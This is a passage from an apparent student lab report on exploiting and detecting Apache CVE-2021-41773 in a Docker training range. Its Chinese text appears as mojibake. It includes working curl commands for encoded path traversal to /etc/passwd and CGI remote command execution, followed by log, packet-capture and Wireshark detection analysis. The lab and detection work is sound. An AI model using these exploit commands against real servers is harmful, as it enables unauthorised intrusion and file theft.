   - **çŠ¶æ€**: 403 Forbidden
   - **åŸå› **: Manualæ–‡æ¡£è·¯å¾„å¯èƒ½æœ‰ç‰¹æ®Šçš„è®¿é—®æ§åˆ¶é…ç½®
   - **å®‰å…¨ç­–ç•¥**: è¡¨æ˜æŸäº›è·¯å¾„æ˜ å°„æœ‰é¢å¤–çš„å®‰å…¨é™åˆ¶
3. ğŸš« **ç›´æ¥æ ¹è·¯å¾„è¢«é˜»æ­¢**

   - **çŠ¶æ€**: 403 Forbidden
   - **åŸå› **: æ ¹è·¯å¾„çš„è·¯å¾„éå†è¢«Apacheçš„åŸºç¡€å®‰å…¨æœºåˆ¶é˜»æ­¢

##### 3.3 è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)æ”»å‡»

###### 3.3.1 CGIè·¯å¾„çš„RCEæ”»å‡»å°è¯•

```bash
# é€šè¿‡CGIè·¯å¾„æ‰§è¡Œshellå‘½ä»¤
curl "http://10.37.133.3:42286/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo Content-Type: text/plain; echo; id"
```

**RCEæ”»å‡»ç»“æœ**:

```bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

![1748164624555](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748164624555.png)
**ğŸ‰ RCEæ”»å‡»æˆåŠŸï¼**

- **æƒé™è·å–**: æˆåŠŸä»¥ `www-data`ç”¨æˆ·èº«ä»½æ‰§è¡Œå‘½ä»¤
- **æ”»å‡»æ–¹å¼**: é€šè¿‡CGIè·¯å¾„ç»“åˆè·¯å¾„éå†ï¼Œç›´æ¥è°ƒç”¨ç³»ç»Ÿshell
- **ç¼–ç æŠ€æœ¯**: ä½¿ç”¨æ··åˆç¼–ç  `.%2e`ç»•è¿‡è·¯å¾„é™åˆ¶

###### 3.3.2 ç³»ç»Ÿä¿¡æ¯æ”¶é›†

```bash
# è·å–ç³»ç»Ÿä¿¡æ¯
curl "http://10.37.133.3:42286/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo Content-Type: text/plain; echo; uname -a"

# æŸ¥çœ‹å½“å‰ç›®å½•
curl "http://10.37.133.3:42286/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo Content-Type: text/plain; echo; pwd"

# åˆ—å‡ºæ ¹ç›®å½•å†…å®¹
curl "http://10.37.133.3:42286/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo Content-Type: text/plain; echo; ls -la /"
```

![1748164663202](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748164663202.png)

##### 3.4 Flagæ–‡ä»¶æœç´¢ä¸è·å–

###### 3.4.1 ç³»ç»Ÿæ–‡ä»¶æœç´¢

```bash
# æœç´¢ç³»ç»Ÿä¸­æ‰€æœ‰åŒ…å«flagçš„æ–‡ä»¶
curl "http://10.37.133.3:42286/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo Content-Type: text/plain; echo; find / -name '*flag*' 2>/dev/null"
```

![1748164677317](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748164677317.png)

æ‰¾åˆ°äº†ï¼flagæ–‡ä»¶åœ¨ `/tmp/flag-{bmha8de6a45-2ae2-4615-97ff-1af1edd5afcf}`**

#### 4. å¨èƒæ£€æµ‹

##### 4.1 Apache è®¿é—®æ—¥å¿—åˆ†æ

###### 4.1.1 å®šä½å®¹å™¨å’Œæ—¥å¿—è·¯å¾„

```bash
# æŸ¥çœ‹è¿è¡Œä¸­çš„ Apache å®¹å™¨
docker ps | grep apache
```

```bash
â”Œâ”€â”€(kaliã‰¿kali-attacker)-[~]
â””â”€$ docker ps | grep apache

a2b4c3a1d377   vulfocus/apache-cve_2021_41773:latest      "/entry.sh"              22 minutes ago   Up 20 seconds           0.0.0.0:42286->80/tcp, :::42286->80/tcp                                                flamboyant_maxwell
```

```bash

# è¿›å…¥å®¹å™¨æŸ¥çœ‹æ—¥å¿—
docker exec -it a2b4c3a1d377 /bin/bash

# Apache è®¿é—®æ—¥å¿—é€šå¸¸ä½äºä»¥ä¸‹è·¯å¾„
ls -la /var/log/apache2/
# é‡ç‚¹å…³æ³¨ access.log å’Œ error.log
```

![1748160129290](image/apacheé¶æ ‡/1748160129290.png)

###### 4.1.2 è®¿é—®æ—¥å¿—åˆ†æ

```bash
# æŸ¥çœ‹æœ€è¿‘çš„è®¿é—®æ—¥å¿—
tail -f /var/log/apache2/access.log

# æœç´¢è·¯å¾„éå†æ”»å‡»ç‰¹å¾
grep -i "%2e%2e\|\.\./" /var/log/apache2/access.log

# æœç´¢CGIç›¸å…³çš„å¯ç–‘è¯·æ±‚
grep -i "cgi-bin" /var/log/apache2/access.log

# æœç´¢iconsè·¯å¾„çš„å¼‚å¸¸è®¿é—®
grep -i "icons.*%2e" /var/log/apache2/access.log
```

![1748161429843](image/apacheé¶æ ‡/1748161429843.png)

![1748161438797](image/apacheé¶æ ‡/1748161438797.png)1. è·¯å¾„éå†æ”»å‡»è®°å½•

**é€šè¿‡ `/icons/`è·¯å¾„çš„æ”»å‡»**ï¼š

```bash
10.37.133.2 - - [25/May/2025:07:39:25 +0000] "GET /icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1" 200 1126 "-" "curl/8.7.1"
```

* **æ”»å‡»ç‰¹å¾**: ä½¿ç”¨ `%2e%2e`ï¼ˆURLç¼–ç çš„ `..`ï¼‰è¿›è¡Œè·¯å¾„éå†
* **ç›®æ ‡æ–‡ä»¶**: `/etc/passwd`ç³»ç»Ÿç”¨æˆ·æ–‡ä»¶
* **çŠ¶æ€ç **: `200` - **æ”»å‡»æˆåŠŸ**ï¼Œè¿”å›äº†1126å­—èŠ‚çš„æ–‡ä»¶å†…å®¹
* **æ”»å‡»å·¥å…·**: `curl/8.7.1`

2. Flagæ–‡ä»¶æœç´¢å°è¯•

æ”»å‡»è€…ç³»ç»Ÿæ€§åœ°æœç´¢flagæ–‡ä»¶çš„å¸¸è§ä½ç½®ï¼š

```bash
10.37.133.2 - - [25/May/2025:07:39:30 +0000] "GET /icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/flag HTTP/1.1" 404 437 "-" "curl/8.7.1"
10.37.133.2 - - [25/May/2025:07:39:34 +0000] "GET /icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/tmp/flag HTTP/1.1" 404 437 "-" "curl/8.7.1"
10.37.133.2 - - [25/May/2025:07:39:39 +0000] "GET /icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/var/www/flag HTTP/1.1" 404 437 "-" "curl/8.7.1"
10.37.133.2 - - [25/May/2025:07:39:48 +0000] "GET /icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/flag HTTP/1.1" 404 437 "-" "curl/8.7.1"
10.37.133.2 - - [25/May/2025:07:39:56 +0000] "GET /icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/var/www/html/flag HTTP/1.1" 404 437 "-" "curl/8.7.1"
10.37.133.2 - - [25/May/2025:07:40:00 +0000] "GET /icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/flag.txt HTTP/1.1" 404 437 "-" "curl/8.7.1"
```

**æ”»å‡»æ¨¡å¼åˆ†æ**ï¼š

- **ç³»ç»Ÿæ€§æœç´¢**: æ”»å‡»è€…æŒ‰é¡ºåºå°è¯•äº†å¤šä¸ªå¯èƒ½çš„flagä½ç½®
- **çŠ¶æ€ç **: å…¨éƒ¨è¿”å› `404 Not Found`ï¼Œè¯´æ˜è¿™äº›ä½ç½®æ²¡æœ‰flagæ–‡ä»¶
- **æ—¶é—´é—´éš”**: æ¯æ¬¡å°è¯•é—´éš”4-8ç§’ï¼Œæ˜¾ç¤ºä¸ºæ‰‹åŠ¨æˆ–è„šæœ¬åŒ–æ”»å‡»

3. è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)æ”»å‡»

**é€šè¿‡CGIè·¯å¾„æ‰§è¡Œå‘½ä»¤**ï¼š

```bash
10.37.133.2 - - [25/May/2025:07:40:16 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 200 188 "-" "curl/8.7.1"
10.37.133.2 - - [25/May/2025:07:40:21 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 200 887 "-" "curl/8.7.1"
10.37.133.2 - - [25/May/2025:07:40:26 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 200 133 "-" "curl/8.7.1"
```

**RCEæ”»å‡»ç‰¹å¾**ï¼š

- **æ”»å‡»è·¯å¾„**: `/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh`
- **ç¼–ç æŠ€æœ¯**: æ··åˆä½¿ç”¨ `.%2e`ç»•è¿‡è·¯å¾„é™åˆ¶
- **HTTPæ–¹æ³•**: `POST` - ç”¨äºå‘é€å‘½ä»¤æ‰§è¡Œçš„payload
- **çŠ¶æ€ç **: `200` - **RCEæ”»å‡»æˆåŠŸ**
- **å“åº”å¤§å°å˜åŒ–**: ä»133å­—èŠ‚åˆ°887å­—èŠ‚ï¼Œè¯´æ˜æ‰§è¡Œäº†ä¸åŒçš„å‘½ä»¤

4.1.3 é”™è¯¯æ—¥å¿—åˆ†æ

```bash
# æŸ¥çœ‹Apacheé”™è¯¯æ—¥å¿—
tail -f /var/log/apache2/error.log

# æœç´¢ä¸è·¯å¾„éå†ç›¸å…³çš„é”™è¯¯
grep -i "path\|directory\|forbidden" /var/log/apache2/error.log

# æœç´¢CGIæ‰§è¡Œç›¸å…³çš„é”™è¯¯
grep -i "cgi\|script" /var/log/apache2/error.log
```

![1748161515881](image/apacheé¶æ ‡/1748161515881.png)

Apacheé”™è¯¯æ—¥å¿—åˆ†æ:

1. è·¯å¾„éå†æ£€æµ‹ä¸é˜»æ­¢

**æ— æ•ˆURIè·¯å¾„é”™è¯¯**ï¼š

```bash
[Sun May 25 07:39:43.793225 2025] [core:error] [pid 20:tid 281472604833344] [client 10.37.133.2:58584] AH10244: invalid URI path (/icons/../../../../index.html)
[Sun May 25 07:39:43.795361 2025] [core:error] [pid 20:tid 281472604833344] [client 10.37.133.2:58584] AH10244: invalid URI path (/icons/../../../../index.cgi)
[Sun May 25 07:39:43.795451 2025] [core:error] [pid 20:tid 281472604833344] [client 10.37.133.2:58584] AH10244: invalid URI path (/icons/../../../../index.pl)
[Sun May 25 07:39:43.795499 2025] [core:error] [pid 20:tid 281472604833344] [client 10.37.133.2:58584] AH10244: invalid URI path (/icons/../../../../index.php)
[Sun May 25 07:39:43.795517 2025] [core:error] [pid 20:tid 281472604833344] [client 10.37.133.2:58584] AH10244: invalid URI path (/icons/../../../../index.xhtml)
[Sun May 25 07:39:43.795536 2025] [core:error] [pid 20:tid 281472604833344] [client 10.37.133.2:58584] AH10244: invalid URI path (/icons/../../../../index.htm)
```

**å…³é”®å‘ç°**ï¼š

- **é”™è¯¯ä»£ç **: `AH10244` - Apacheæ£€æµ‹åˆ°æ— æ•ˆçš„URIè·¯å¾„
- **æ”»å‡»æ¨¡å¼**: ä½¿ç”¨æœªç¼–ç çš„ `../../../../`è¿›è¡Œè·¯å¾„éå†
- **æ—¶é—´é›†ä¸­**: åœ¨07:39:43çš„å‡ æ¯«ç§’å†…è¿ç»­è§¦å‘6æ¬¡é”™è¯¯
- **ç›®æ ‡æ–‡ä»¶**: æ”»å‡»è€…å°è¯•è®¿é—®å„ç§indexæ–‡ä»¶ï¼ˆ.html, .cgi, .pl, .php, .xhtml, .htmï¼‰
- **é˜²æŠ¤æœºåˆ¶**: Apacheçš„è·¯å¾„è§„èŒƒåŒ–æ£€æŸ¥æˆåŠŸé˜»æ­¢äº†è¿™äº›æ”»å‡»

2. CGIæ‰§è¡Œé”™è¯¯åˆ†æ

**CGIæ”»å‡»åˆ†æ**ï¼š

- **é”™è¯¯ç±»å‹**: `cgid:error` - CGIå®ˆæŠ¤è¿›ç¨‹é”™è¯¯
- **æƒé™é—®é¢˜**: ç³»ç»Ÿæ‹’ç»æ‰§è¡Œ `/etc/passwd`æ–‡ä»¶ï¼ˆå› ä¸ºå®ƒä¸æ˜¯å¯æ‰§è¡Œæ–‡ä»¶ï¼‰
- **æ”»å‡»æ„å›¾**: æ”»å‡»è€…è¯•å›¾é€šè¿‡CGIè·¯å¾„ç›´æ¥æ‰§è¡Œç³»ç»Ÿæ–‡ä»¶
- **é˜²æŠ¤æ•ˆæœ**: æ–‡ä»¶ç³»ç»Ÿæƒé™æˆåŠŸé˜»æ­¢äº†æ¶æ„æ‰§è¡Œ

**Shellæ‰§è¡Œé”™è¯¯**ï¼š

```bash
[Sun May 25 07:41:05.002629 2025] [cgid:error] [pid 20:tid 281472728565312] [client 10.37.133.3:58948] End of script output before headers: sh
```

**é‡è¦å‘ç°**ï¼š

- **æ”»å‡»æºå˜åŒ–**: ä» `10.37.133.2`åˆ‡æ¢åˆ° `10.37.133.3`
- **æ‰§è¡Œç›®æ ‡**: ç›´æ¥è°ƒç”¨ `sh` shell
- **é”™è¯¯æ€§è´¨**: "End of script output before headers" - è¡¨æ˜shellè¢«æ‰§è¡Œä½†æ²¡æœ‰äº§ç”Ÿæœ‰æ•ˆçš„CGIè¾“å‡ºå¤´
- **æ”»å‡»æˆåŠŸ**: å°½ç®¡æœ‰é”™è¯¯ï¼Œä½†è¿™å®é™…ä¸Šè¡¨æ˜RCEæ”»å‡»å¯èƒ½å·²ç»æˆåŠŸ

5. å®‰å…¨é˜²æŠ¤æ•ˆæœè¯„ä¼°

**æˆåŠŸçš„é˜²æŠ¤**ï¼š

- âœ… **è·¯å¾„è§„èŒƒåŒ–æ£€æŸ¥**: é˜»æ­¢äº†æœªç¼–ç çš„è·¯å¾„éå†
- âœ… **æ–‡ä»¶æƒé™æ§åˆ¶**: é˜»æ­¢äº†éå¯æ‰§è¡Œæ–‡ä»¶çš„æ‰§è¡Œ
- âœ… **CGIå®‰å…¨æœºåˆ¶**: é™åˆ¶äº†æ¶æ„CGIæ‰§è¡Œ

**é˜²æŠ¤ç»•è¿‡**ï¼š

- âŒ **ç¼–ç ç»•è¿‡**: URLç¼–ç çš„è·¯å¾„éå†æœªè¢«é˜»æ­¢ï¼ˆä»è®¿é—®æ—¥å¿—å¯è§ï¼‰
- âŒ **Shellæ‰§è¡Œ**: æœ€ç»ˆæˆåŠŸæ‰§è¡Œäº†shellå‘½ä»¤

##### 4.2 ç½‘ç»œæµé‡æ•è·ä¸åˆ†æ

###### 4.2.1 ç¡®å®šå®¹å™¨ç½‘ç»œä¿¡æ¯

```bash
# è·å– Apache å®¹å™¨çš„è¯¦ç»†ä¿¡æ¯
docker inspect a2b4c3a1d377 | grep -A 10 -B 5 "IPAddress"
```

![1748160719557](image/apacheé¶æ ‡/1748160719557.png)
æ ¹æ®å®¹å™¨ä¿¡æ¯ï¼Œå†…éƒ¨ IP ä¸º `172.17.0.2`

###### 4.2.2 HTTPæµé‡ç›‘æ§

```bash
# ç›‘å¬ Docker ç½‘æ¡¥ä¸Šçš„ HTTP æµé‡
sudo tcpdump -i docker0 -A -w apache_cve_traffic.pcap 'host 172.17.0.2'
```

åœ¨å¦ä¸€ä¸ªç»ˆç«¯æ‰§è¡Œæ”»å‡»å‘½ä»¤ï¼Œç„¶ååœæ­¢æŠ“åŒ…ï¼š

```bash
# æ‰§è¡Œè·¯å¾„éå†æ”»å‡»
curl "http://10.37.133.3:42286/icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# æ‰§è¡ŒRCEæ”»å‡»
curl "http://10.37.133.3:42286/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo Content-Type: text/plain; echo; id"
```

![1748160898808](image/apacheé¶æ ‡/1748160898808.png)

![1748160908687](image/apacheé¶æ ‡/1748160908687.png)

###### 4.2.3 æµé‡åˆ†æè¦ç‚¹

ä½¿ç”¨ Wireshark åˆ†ææ•è·çš„æµé‡ï¼š

1. **è·¯å¾„éå†è¯†åˆ«**: æŸ¥æ‰¾åŒ…å« `%2e%2e`ç¼–ç çš„HTTP GETè¯·æ±‚
2. **RCEæ”»å‡»è¯†åˆ«**: å¯»æ‰¾å‘CGIè·¯å¾„å‘é€POSTæ•°æ®çš„è¯·æ±‚
3. **å“åº”åˆ†æ**: è§‚å¯ŸæœåŠ¡å™¨è¿”å›çš„æ•æ„Ÿæ–‡ä»¶å†…å®¹æˆ–å‘½ä»¤æ‰§è¡Œç»“æœ
4. **å¼‚å¸¸æ¨¡å¼**: è¯†åˆ«çŸ­æ—¶é—´å†…å¤§é‡è·¯å¾„éå†å°è¯•çš„æ¨¡å¼

![1748160976060](image/apacheé¶æ ‡/1748160976060.png)

wiresharkæµé‡åˆ†æ

1. æ”»å‡»æµé‡æ¦‚è§ˆ

**æ•è·çš„æ•°æ®åŒ…æ€»æ•°**: 20ä¸ªæ•°æ®åŒ…
**æ”»å‡»æŒç»­æ—¶é—´**: çº¦4.2ç§’
**æ”»å‡»æº**: `10.37.133.3` (Kaliæ”»å‡»æœº)
**ç›®æ ‡**: `172.17.0.2:80` (Apacheå®¹å™¨)

2. ç¬¬ä¸€æ¬¡æ”»å‡»è¿æ¥åˆ†æ (æ•°æ®åŒ…1-10)

2.1 TCPè¿æ¥å»ºç«‹

```
æ•°æ®åŒ…1-3: TCPä¸‰æ¬¡æ¡æ‰‹
- æ•°æ®åŒ…1 (0.000000s): SYN - æ”»å‡»æœºå‘èµ·è¿æ¥è¯·æ±‚
- æ•°æ®åŒ…2 (0.000030s): SYN+ACK - æœåŠ¡å™¨å“åº”è¿æ¥
- æ•°æ®åŒ…3 (0.000040s): ACK - è¿æ¥å»ºç«‹å®Œæˆ
```

**è¿æ¥ç‰¹å¾**:

- **ç«¯å£æ˜ å°„**: æ”»å‡»æœºç«¯å£40722 â†’ æœåŠ¡å™¨ç«¯å£80
- **å»ºç«‹æ—¶é—´**: ä»…ç”¨æ—¶40å¾®ç§’ï¼Œè¿æ¥å»ºç«‹éå¸¸å¿«é€Ÿ
- **ç½‘ç»œå»¶è¿Ÿ**: æä½å»¶è¿Ÿï¼Œè¯´æ˜æ˜¯æœ¬åœ°Dockerç½‘ç»œ

2.2 RCEæ”»å‡»è½½è·

```
æ•°æ®åŒ…4 (0.000105s): HTTP POSTè¯·æ±‚
- æ–¹æ³•: POST
- è·¯å¾„: /cgi-bin/..%2e/..%2e/..%2e/..%2e/bin/sh
- é•¿åº¦: 290å­—èŠ‚
- åè®®: HTTP
```

**æ”»å‡»ç‰¹å¾åˆ†æ**:

- **æ”»å‡»ç±»å‹**: è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)
- **ç¼–ç æŠ€æœ¯**: ä½¿ç”¨ `..%2e`æ··åˆç¼–ç ç»•è¿‡è·¯å¾„æ£€æŸ¥
- **ç›®æ ‡è·¯å¾„**: é€šè¿‡CGIè·¯å¾„éå†åˆ° `/bin/sh`
- **HTTPæ–¹æ³•**: POST - ç”¨äºå‘é€å‘½ä»¤æ‰§è¡Œpayload
- **è½½è·å¤§å°**: 290å­—èŠ‚ï¼ŒåŒ…å«å®Œæ•´çš„CGIå‘½ä»¤æ‰§è¡Œæ•°æ®

2.3 æœåŠ¡å™¨å“åº”

```
æ•°æ®åŒ…5 (0.000125s): TCP ACK - æœåŠ¡å™¨ç¡®è®¤æ”¶åˆ°è¯·æ±‚
æ•°æ®åŒ…6 (0.040140s): HTTP 200 OKå“åº”
- çŠ¶æ€ç : 200 OK
- å†…å®¹ç±»å‹: text/plain
- å“åº”é•¿åº¦: 254å­—èŠ‚
- å¤„ç†æ—¶é—´: 40æ¯«ç§’
```

**å“åº”åˆ†æ**:

- **æ”»å‡»æˆåŠŸ**: HTTP 200çŠ¶æ€ç è¡¨æ˜RCEæ”»å‡»æˆåŠŸæ‰§è¡Œ
- **å“åº”å†…å®¹**: text/plainæ ¼å¼ï¼ŒåŒ…å«å‘½ä»¤æ‰§è¡Œç»“æœ
- **å¤„ç†å»¶è¿Ÿ**: 40æ¯«ç§’çš„å¤„ç†æ—¶é—´ï¼Œè¯´æ˜æœåŠ¡å™¨æ‰§è¡Œäº†shellå‘½ä»¤
- **æ•°æ®å¤§å°**: 254å­—èŠ‚å“åº”ï¼Œå¯èƒ½åŒ…å« `id`å‘½ä»¤çš„è¾“å‡ºç»“æœ

2.4 è¿æ¥å…³é—­

```
æ•°æ®åŒ…7-10: TCPè¿æ¥å…³é—­
- æ•°æ®åŒ…8: æ”»å‡»æœºå‘èµ·FIN+ACK
- æ•°æ®åŒ…9: æœåŠ¡å™¨å“åº”FIN+ACK  
- æ•°æ®åŒ…10: æ”»å‡»æœºç¡®è®¤ACK
```

3. ç¬¬äºŒæ¬¡æ”»å‡»è¿æ¥åˆ†æ (æ•°æ®åŒ…11-20)

3.1 æ–°è¿æ¥å»ºç«‹

```
æ•°æ®åŒ…11-13 (4.212s): ç¬¬äºŒæ¬¡TCPä¸‰æ¬¡æ¡æ‰‹
- æ—¶é—´é—´éš”: 4.2ç§’åå‘èµ·æ–°è¿æ¥
- æ–°ç«¯å£: 40254 â†’ 80
- å»ºç«‹æ—¶é—´: 18å¾®ç§’
```

3.2 è·¯å¾„éå†æ”»å‡»

```
æ•°æ®åŒ…14 (4.212111s): HTTP GETè¯·æ±‚
- æ–¹æ³•: GET  
- è·¯å¾„: /icons/..%2e%2e/..%2e%2e/..%2e%2e/..%2e%2e/etc/passwd
- é•¿åº¦: 191å­—èŠ‚
- åè®®: HTTP
```

**æ”»å‡»ç‰¹å¾åˆ†æ**:

- **æ”»å‡»ç±»å‹**: è·¯å¾„éå†æ–‡ä»¶è¯»å–
- **ç›®æ ‡æ–‡ä»¶**: `/etc/passwd`ç³»ç»Ÿç”¨æˆ·æ–‡ä»¶
- **æ”»å‡»è·¯å¾„**: é€šè¿‡ `/icons/`è·¯å¾„è¿›è¡Œéå†
- **ç¼–ç æ–¹å¼**: `..%2e%2e`åŒé‡ç¼–ç ç»•è¿‡æ£€æŸ¥
- **HTTPæ–¹æ³•**: GET - ç”¨äºæ–‡ä»¶è¯»å–

3.3 æ–‡ä»¶è¯»å–æˆåŠŸ

```
æ•°æ®åŒ…16 (4.212740s): HTTP 200 OKå“åº”
- çŠ¶æ€ç : 200 OK
- å“åº”é•¿åº¦: 1192å­—èŠ‚
- å¤„ç†æ—¶é—´: 0.6æ¯«ç§’
```

**å“åº”åˆ†æ**:

- **æ”»å‡»æˆåŠŸ**: HTTP 200çŠ¶æ€ç ç¡®è®¤æ–‡ä»¶è¯»å–æˆåŠŸ
- **æ–‡ä»¶å¤§å°**: 1192å­—èŠ‚ï¼Œä¸ `/etc/passwd`æ–‡ä»¶å¤§å°ä¸€è‡´
- **å¿«é€Ÿå“åº”**: 0.6æ¯«ç§’å¤„ç†æ—¶é—´ï¼Œè¯´æ˜æ˜¯ç›´æ¥æ–‡ä»¶è¯»å–
- **æ•°æ®æ³„éœ²**: æˆåŠŸè·å–äº†ç³»ç»Ÿç”¨æˆ·ä¿¡æ¯

4. æ”»å‡»æ¨¡å¼æ€»ç»“

4.1 æ”»å‡»æ—¶åºåˆ†æ

```
æ—¶é—´è½´:
0.000s - 0.041s: RCEæ”»å‡» (è¿æ¥1)
4.212s - 4.216s: æ–‡ä»¶è¯»å–æ”»å‡» (è¿æ¥2)
```

**æ”»å‡»ç­–ç•¥**:

- **åˆ†é˜¶æ®µæ”»å‡»**: å…ˆæ‰§è¡Œå‘½ä»¤è·å–æƒé™ï¼Œå†è¯»å–æ•æ„Ÿæ–‡ä»¶
- **è¿æ¥å¤ç”¨**: ä½¿ç”¨ä¸åŒTCPè¿æ¥é¿å…æ£€æµ‹
- **æ—¶é—´é—´éš”**: 4ç§’é—´éš”ï¼Œå¯èƒ½æ˜¯æ‰‹åŠ¨æ“ä½œæˆ–è„šæœ¬å»¶è¿Ÿ

4.2 æŠ€æœ¯ç‰¹å¾è¯†åˆ«

```
ç¼–ç æŠ€æœ¯å¯¹æ¯”:
- RCEæ”»å‡»: ..%2e (æ··åˆç¼–ç )
- æ–‡ä»¶è¯»å–: ..%2e%2e (åŒé‡ç¼–ç )
```

**ç»•è¿‡æŠ€æœ¯**:

- **è·¯å¾„å¤šæ ·åŒ–**: CGIè·¯å¾„å’Œiconsè·¯å¾„åˆ†åˆ«åˆ©ç”¨
- **ç¼–ç å˜åŒ–**: ä¸åŒçš„URLç¼–ç æ–¹å¼
- **æ–¹æ³•åˆ‡æ¢**: POSTæ‰§è¡Œå‘½ä»¤ï¼ŒGETè¯»å–æ–‡ä»¶

5. å®‰å…¨æ£€æµ‹è¦ç‚¹

5.1 æµé‡ç‰¹å¾æ£€æµ‹

```bash
# æ£€æµ‹è·¯å¾„éå†ç‰¹å¾
- URLåŒ…å«: %2e%2e, ..%2e, ../../../../
- è·¯å¾„æ¨¡å¼: /cgi-bin/.., /icons/..
- ç›®æ ‡æ–‡ä»¶: /etc/passwd, /bin/sh
```

5.2 å¼‚å¸¸è¡Œä¸ºè¯†åˆ«

```bash
# å¼‚å¸¸å“åº”æ¨¡å¼
- CGIè·¯å¾„è¿”å›200çŠ¶æ€ç 
- å¤§é‡å­—èŠ‚çš„æ–‡ä»¶è¯»å–å“åº”
- çŸ­æ—¶é—´å†…å¤šæ¬¡è·¯å¾„éå†å°è¯•
```

5.3 ç½‘ç»œç›‘æ§è§„åˆ™

```bash
# Wiresharkè¿‡æ»¤è§„åˆ™
http.request.uri contains "%2e%2e" or 
http.request.uri contains "cgi-bin" and http.request.uri contains ".." or
http.request.uri contains "icons" and http.request.uri contains ".."
```

6. æ”»å‡»æˆåŠŸæŒ‡æ ‡

**ç¡®è®¤æ”»å‡»æˆåŠŸçš„å…³é”®è¯æ®**:

1. âœ… **RCEæˆåŠŸ**: POSTè¯·æ±‚è¿”å›200çŠ¶æ€ç ï¼Œ254å­—èŠ‚å“åº”
2. âœ… **æ–‡ä»¶è¯»å–æˆåŠŸ**: GETè¯·æ±‚è¿”å›200çŠ¶æ€ç ï¼Œ1192å­—èŠ‚å“åº”
3. âœ… **æƒé™è·å–**: èƒ½å¤Ÿæ‰§è¡Œç³»ç»Ÿå‘½ä»¤å’Œè¯»å–æ•æ„Ÿæ–‡ä»¶
4. âœ… **ç»•è¿‡é˜²æŠ¤**: æˆåŠŸç»•è¿‡Apacheçš„è·¯å¾„æ£€æŸ¥æœºåˆ¶

## å››ã€å®éªŒæ€»ç»“

æœ¬æ¬¡å®éªŒæˆåŠŸå®Œæˆäº†å¯¹å¤šä¸ªå±‚æ¬¡ç½‘ç»œä¸­å…¸å‹é¶æ ‡çš„æ”»å‡»ã€åˆ©ç”¨åŠæ£€æµ‹ï¼ŒåŒ…æ‹¬ï¼š

- **ç¬¬ä¸€å±‚é¶æ ‡**: `c4pr1c3/vulshare_nginx-php-flag:latest` å’Œ `vulfocus/thinkphp-cve_2018_1002015:latest`
- **ç¬¬äºŒå±‚é¶æ ‡**: `vulfocus/weblogic-cve_2019_2725:latest` å’Œ `vulfocus/apache-cve_2021_41773:latest`

é€šè¿‡å®è·µï¼Œæˆ‘ä»¬è¾¾æˆäº†ä»¥ä¸‹ä¸»è¦å­¦ä¹ å’Œæ“ä½œç›®æ ‡ï¼š

1. **ç¯å¢ƒæ­å»ºä¸é¶åœºç†Ÿæ‚‰**ï¼š

   * æˆåŠŸåœ¨ macOS ç‰©ç†ä¸»æœºä¸Šé€šè¿‡ Parallels Desktop éƒ¨ç½²äº† Kali Linux è™šæ‹Ÿæœºä½œä¸ºæ”»å‡»æœºã€‚
   * åœ¨ Kali ç¯å¢ƒä¸­ï¼Œç†Ÿç»ƒé…ç½®å’Œä½¿ç”¨äº† Docker åŠ Vulfocus å¹³å°ï¼Œèƒ½å¤Ÿé¡ºåˆ©æ‹‰å–ã€å¯åŠ¨å’Œç®¡ç†ç›®æ ‡é¶æœº Docker é•œåƒï¼Œä¸ºåç»­çš„æ¸—é€æµ‹è¯•å’Œå®‰å…¨åˆ†æå¥ å®šäº†åŸºç¡€ã€‚
2. **æ¼æ´åˆ†æä¸åˆ©ç”¨å®è·µ**ï¼š

   * **é’ˆå¯¹ `c4pr1c3/vulshare_nginx-php-flag:latest`** (Nginx + PHP å‘½ä»¤æ³¨å…¥æ¼æ´):
     * é€šè¿‡ä¿¡æ¯æ”¶é›†ï¼ˆ`nmap` æ‰«æã€æµè§ˆå™¨è®¿é—®é¡µé¢æç¤º `index.php?cmd=ls /tmp`ï¼‰ï¼Œå¿«é€Ÿè¯†åˆ«äº†åŸºäº GET å‚æ•°çš„å‘½ä»¤æ³¨å…¥æ¼æ´ã€‚
     * åˆ©ç”¨ `curl` å·¥å…·æ„é€ æ¶æ„ URL (å¦‚ `index.php?cmd=ls%20/tmp`)ï¼ŒæˆåŠŸæ‰§è¡Œäº†ä»»æ„ç³»ç»Ÿå‘½ä»¤ï¼ˆå¦‚ `ls`, `id`, `uname -a`, `ls -la /`ï¼‰ï¼Œå¹¶ç›´æ¥åœ¨ `/tmp` ç›®å½•ä¸‹æ‰¾åˆ°äº† flagã€‚
     * éªŒè¯äº†æ¼æ´çš„å¹¿æ³›åˆ©ç”¨æ€§ï¼Œèƒ½å¤Ÿè·å–ç³»ç»Ÿä¿¡æ¯ã€ç”¨æˆ·ä¿¡æ¯å’Œç›®å½•ç»“æ„ã€‚
